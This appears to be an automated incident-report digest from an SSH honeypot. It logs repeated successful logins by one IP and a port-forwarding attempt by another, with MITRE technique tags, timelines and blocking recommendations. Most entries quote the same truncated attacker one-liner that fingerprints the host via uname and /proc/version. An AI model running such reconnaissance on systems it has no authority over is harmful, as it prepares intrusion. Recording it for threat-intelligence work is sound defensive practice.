### 🔴 HIGH · IR-dcc3ab2e98f9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:29 |
| **Last Seen** | 2026-09-06 05:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:29:54` | `cowrie.session.connect` |
| `2026-09-06 05:29:54` | `cowrie.client.version` |
| `2026-09-06 05:29:54` | `cowrie.client.kex` |
| `2026-09-06 05:29:55` | `cowrie.login.success` |
| `2026-09-06 05:29:56` | `cowrie.session.params` |
| `2026-09-06 05:29:56` | `cowrie.command.input` |
| `2026-09-06 05:29:56` | `cowrie.log.closed` |
| `2026-09-06 05:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7865bcd7be6d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:33 |
| **Last Seen** | 2026-09-06 05:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:33:30` | `cowrie.session.connect` |
| `2026-09-06 05:33:30` | `cowrie.client.version` |
| `2026-09-06 05:33:30` | `cowrie.client.kex` |
| `2026-09-06 05:33:31` | `cowrie.login.success` |
| `2026-09-06 05:33:32` | `cowrie.session.params` |
| `2026-09-06 05:33:32` | `cowrie.command.input` |
| `2026-09-06 05:33:33` | `cowrie.log.closed` |
| `2026-09-06 05:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e155dee65a4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:35 |
| **Last Seen** | 2026-09-06 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:35:25` | `cowrie.session.connect` |
| `2026-09-06 05:35:25` | `cowrie.client.version` |
| `2026-09-06 05:35:25` | `cowrie.client.kex` |
| `2026-09-06 05:35:26` | `cowrie.login.success` |
| `2026-09-06 05:35:27` | `cowrie.session.params` |
| `2026-09-06 05:35:27` | `cowrie.command.input` |
| `2026-09-06 05:35:27` | `cowrie.log.closed` |
| `2026-09-06 05:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fac5dcb022c8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:37 |
| **Last Seen** | 2026-09-06 05:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:37:22` | `cowrie.session.connect` |
| `2026-09-06 05:37:22` | `cowrie.client.version` |
| `2026-09-06 05:37:22` | `cowrie.client.kex` |
| `2026-09-06 05:37:23` | `cowrie.login.success` |
| `2026-09-06 05:37:24` | `cowrie.session.params` |
| `2026-09-06 05:37:24` | `cowrie.command.input` |
| `2026-09-06 05:37:24` | `cowrie.log.closed` |
| `2026-09-06 05:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e39c41baae3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:39 |
| **Last Seen** | 2026-09-06 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:39:26` | `cowrie.session.connect` |
| `2026-09-06 05:39:26` | `cowrie.client.version` |
| `2026-09-06 05:39:26` | `cowrie.client.kex` |
| `2026-09-06 05:39:26` | `cowrie.login.success` |
| `2026-09-06 05:39:27` | `cowrie.session.params` |
| `2026-09-06 05:39:27` | `cowrie.command.input` |
| `2026-09-06 05:39:27` | `cowrie.log.closed` |
| `2026-09-06 05:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78fb23e34e2e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:41 |
| **Last Seen** | 2026-09-06 05:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:41:26` | `cowrie.session.connect` |
| `2026-09-06 05:41:26` | `cowrie.client.version` |
| `2026-09-06 05:41:26` | `cowrie.client.kex` |
| `2026-09-06 05:41:27` | `cowrie.login.success` |
| `2026-09-06 05:41:29` | `cowrie.session.params` |
| `2026-09-06 05:41:29` | `cowrie.command.input` |
| `2026-09-06 05:41:29` | `cowrie.log.closed` |
| `2026-09-06 05:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd30ceb7d00

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 05:42 |
| **Last Seen** | 2026-09-06 05:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:42:29` | `cowrie.session.connect` |
| `2026-09-06 05:42:29` | `cowrie.client.version` |
| `2026-09-06 05:42:30` | `cowrie.client.kex` |
| `2026-09-06 05:42:30` | `cowrie.login.success` |
| `2026-09-06 05:42:30` | `cowrie.direct-tcpip.request` |
| `2026-09-06 05:42:30` | `cowrie.direct-tcpip.data` |
| `2026-09-06 05:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660d4731a066

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:43 |
| **Last Seen** | 2026-09-06 05:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:43:13` | `cowrie.session.connect` |
| `2026-09-06 05:43:14` | `cowrie.client.version` |
| `2026-09-06 05:43:14` | `cowrie.client.kex` |
| `2026-09-06 05:43:15` | `cowrie.login.success` |
| `2026-09-06 05:43:16` | `cowrie.session.params` |
| `2026-09-06 05:43:16` | `cowrie.command.input` |
| `2026-09-06 05:43:17` | `cowrie.log.closed` |
| `2026-09-06 05:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9040cc3a13d7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:45 |
| **Last Seen** | 2026-09-06 05:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:45:00` | `cowrie.session.connect` |
| `2026-09-06 05:45:00` | `cowrie.client.version` |
| `2026-09-06 05:45:00` | `cowrie.client.kex` |
| `2026-09-06 05:45:01` | `cowrie.login.success` |
| `2026-09-06 05:45:02` | `cowrie.session.params` |
| `2026-09-06 05:45:02` | `cowrie.command.input` |
| `2026-09-06 05:45:02` | `cowrie.log.closed` |
| `2026-09-06 05:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da3152904866

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:46 |
| **Last Seen** | 2026-09-06 05:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:46:48` | `cowrie.session.connect` |
| `2026-09-06 05:46:48` | `cowrie.client.version` |
| `2026-09-06 05:46:48` | `cowrie.client.kex` |
| `2026-09-06 05:46:50` | `cowrie.login.success` |
| `2026-09-06 05:46:51` | `cowrie.session.params` |
| `2026-09-06 05:46:51` | `cowrie.command.input` |
| `2026-09-06 05:46:51` | `cowrie.log.closed` |
| `2026-09-06 05:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c4e1449e5ca

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:48 |
| **Last Seen** | 2026-09-06 05:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:48:36` | `cowrie.session.connect` |
| `2026-09-06 05:48:36` | `cowrie.client.version` |
| `2026-09-06 05:48:36` | `cowrie.client.kex` |
| `2026-09-06 05:48:37` | `cowrie.login.success` |
| `2026-09-06 05:48:39` | `cowrie.session.params` |
| `2026-09-06 05:48:39` | `cowrie.command.input` |
| `2026-09-06 05:48:39` | `cowrie.log.closed` |
| `2026-09-06 05:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a57e70b4a920

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:50 |
| **Last Seen** | 2026-09-06 05:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:50:25` | `cowrie.session.connect` |
| `2026-09-06 05:50:25` | `cowrie.client.version` |
| `2026-09-06 05:50:25` | `cowrie.client.kex` |
| `2026-09-06 05:50:26` | `cowrie.login.success` |
| `2026-09-06 05:50:27` | `cowrie.session.params` |
| `2026-09-06 05:50:27` | `cowrie.command.input` |
| `2026-09-06 05:50:27` | `cowrie.log.closed` |
| `2026-09-06 05:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af34ff79ed50

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:52 |
| **Last Seen** | 2026-09-06 05:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:52:15` | `cowrie.session.connect` |
| `2026-09-06 05:52:15` | `cowrie.client.version` |
| `2026-09-06 05:52:15` | `cowrie.client.kex` |
| `2026-09-06 05:52:16` | `cowrie.login.success` |
| `2026-09-06 05:52:17` | `cowrie.session.params` |
| `2026-09-06 05:52:17` | `cowrie.command.input` |
| `2026-09-06 05:52:17` | `cowrie.log.closed` |
| `2026-09-06 05:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c93ae4a99a4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:54 |
| **Last Seen** | 2026-09-06 05:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:54:07` | `cowrie.session.connect` |
| `2026-09-06 05:54:07` | `cowrie.client.version` |
| `2026-09-06 05:54:08` | `cowrie.client.kex` |
| `2026-09-06 05:54:09` | `cowrie.login.success` |
| `2026-09-06 05:54:09` | `cowrie.session.params` |
| `2026-09-06 05:54:09` | `cowrie.command.input` |
| `2026-09-06 05:54:10` | `cowrie.log.closed` |
| `2026-09-06 05:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e799fed29f6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:56 |
| **Last Seen** | 2026-09-06 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:56:00` | `cowrie.session.connect` |
| `2026-09-06 05:56:00` | `cowrie.client.version` |
| `2026-09-06 05:56:00` | `cowrie.client.kex` |
| `2026-09-06 05:56:01` | `cowrie.login.success` |
| `2026-09-06 05:56:02` | `cowrie.session.params` |
| `2026-09-06 05:56:02` | `cowrie.command.input` |
| `2026-09-06 05:56:02` | `cowrie.log.closed` |
| `2026-09-06 05:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6813831dfa89

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:57 |
| **Last Seen** | 2026-09-06 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:57:57` | `cowrie.session.connect` |
| `2026-09-06 05:57:57` | `cowrie.client.version` |
| `2026-09-06 05:57:57` | `cowrie.client.kex` |
| `2026-09-06 05:57:58` | `cowrie.login.success` |
| `2026-09-06 05:57:59` | `cowrie.session.params` |
| `2026-09-06 05:57:59` | `cowrie.command.input` |
| `2026-09-06 05:57:59` | `cowrie.log.closed` |
| `2026-09-06 05:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fc7cbd10ae7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 05:59 |
| **Last Seen** | 2026-09-06 05:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 05:59:57` | `cowrie.session.connect` |
| `2026-09-06 05:59:57` | `cowrie.client.version` |
| `2026-09-06 05:59:58` | `cowrie.client.kex` |
| `2026-09-06 05:59:58` | `cowrie.login.success` |
| `2026-09-06 05:59:59` | `cowrie.session.params` |
| `2026-09-06 05:59:59` | `cowrie.command.input` |
| `2026-09-06 05:59:59` | `cowrie.log.closed` |
| `2026-09-06 05:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53aa94a034e7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:01 |
| **Last Seen** | 2026-09-06 06:02 |
